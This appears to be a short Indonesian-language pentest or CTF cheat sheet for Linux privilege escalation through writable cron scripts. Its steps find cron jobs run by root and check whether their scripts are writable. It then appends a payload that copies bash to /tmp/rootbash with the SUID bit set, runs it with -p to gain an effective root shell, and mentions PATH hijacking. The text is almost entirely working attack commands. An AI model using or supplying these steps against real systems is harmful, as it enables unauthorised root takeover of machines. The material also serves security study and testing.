# Writable Cron

## Cari cron jobs
```bash
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
```

## Cari script writable yang dijalankan ROOT
```bash
ls -la /path/ke/script.sh
# Cek: -rwxrwxr-x / group kita / world-writable?
```

## Inject payload
```bash
echo 'cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash' >> /path/ke/script.sh
```

## Tunggu cron, lalu eksekusi
```bash
/tmp/rootbash -p                              # -p WAJIB (pertahankan euid root)
id                                            # euid=0
```

## PATH Hijacking
Cek juga jika cron panggil command tanpa full path.
